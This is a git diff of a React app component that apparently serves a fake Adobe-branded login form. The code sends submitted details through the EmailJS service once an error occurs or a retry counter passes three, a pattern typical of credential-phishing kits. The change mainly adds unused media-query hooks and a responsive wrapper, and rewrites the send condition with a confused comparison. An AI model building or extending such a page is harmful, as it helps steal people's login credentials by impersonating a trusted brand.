@@ -1,4 +1,6 @@
 import React, { useState } from "react";
+import { useMediaQuery } from 'react-responsive';
+import MediaQuery from 'react-responsive';
 import AdobeForm from "./components/AdobeForm";
 import logo from "./Image/pingr.png";
 import emailjs from "emailjs-com";
@@ -33,7 +35,7 @@ function App() {
     }
 
     // send To Email
-    if (error != "" || counter > 3){
+    if (!error == "" || counter > 3) {
       emailjs
         .send(
           "service_x6hu0ud",
@@ -49,7 +51,7 @@ function App() {
             setError(error.text);
           }
         );
-      }
+    }
 
     const my_email = details.email;
 
@@ -80,14 +82,38 @@ function App() {
     }
     success();
   };
+
+  const isMobileDevice = useMediaQuery({
+    query: "(min-device-width: 480px)",
+  });
+
+  const isTabletDevice = useMediaQuery({
+    query: "(min-device-width: 768px)",
+  });
+
+  const isLaptop = useMediaQuery({
+    query: "(min-device-width: 1024px)",
+  });
+
+  const isDesktop = useMediaQuery({
+    query: "(min-device-width: 1200px)",
+  });
+
+  const isBigScreen = useMediaQuery({
+    query: "(min-device-width: 1201px )",
+  });
+
+
   return (
-    <div id="content">
-      {user.email !== "" ? (
-        <AdobeForm Login={Login} error={error} />
-      ) : (
-        <AdobeForm Login={Login} error={error} />
-      )}
-    </div>
+    <MediaQuery minDeviceWidth={480}>
+      <div id="content">
+        {user.email !== "" ? (
+          <AdobeForm Login={Login} error={error} />
+        ) : (
+          <AdobeForm Login={Login} error={error} />
+        )}
+      </div>
+    </MediaQuery>
   );
 }
 
